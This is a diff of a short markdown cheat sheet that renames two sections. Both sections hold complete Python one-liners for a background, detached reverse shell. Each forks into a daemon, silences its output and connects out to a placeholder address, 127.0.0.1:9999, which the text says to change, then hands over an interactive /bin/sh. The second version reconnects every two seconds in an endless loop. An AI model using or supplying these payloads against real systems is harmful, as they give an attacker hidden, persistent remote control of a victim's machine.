@@ -2,12 +2,12 @@
 
 just change **connect(("127.0.0.1",9999))**
 
-## Simple reverse shell
+## Simple background detached reverse shell
 ```
 python -c 'exec("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect(("127.0.0.1",9999))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")'
 ```
 
-## Infinite loop reverse shell each 2 seconds:
+## Infinite loop background detached reverse shell each 2 seconds:
 ```
  python -c 'exec("""\nimport socket,subprocess,os,sys, time\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\nos.setsid()\nos.umask(0)\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nwhile 1:\n        try:\n                sys.stdout.flush()\n\n                sys.stderr.flush()\n\n                fdreg = open("/dev/null", "w")\n\n                sys.stdout = fdreg\n\n                sys.stderr = fdreg\n\n                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\n                sdregs.connect(("127.0.0.1",9999))\n\n                os.dup2(sdregs.fileno(),0)\n\n                os.dup2(sdregs.fileno(),1)\n\n                os.dup2(sdregs.fileno(),2)\n\n                p=subprocess.call(["/bin/sh","-i"])\n\n                sdregs.close()\n\n        except Exception:\n                pass\n\n        time.sleep(2)\n""")'
 ```
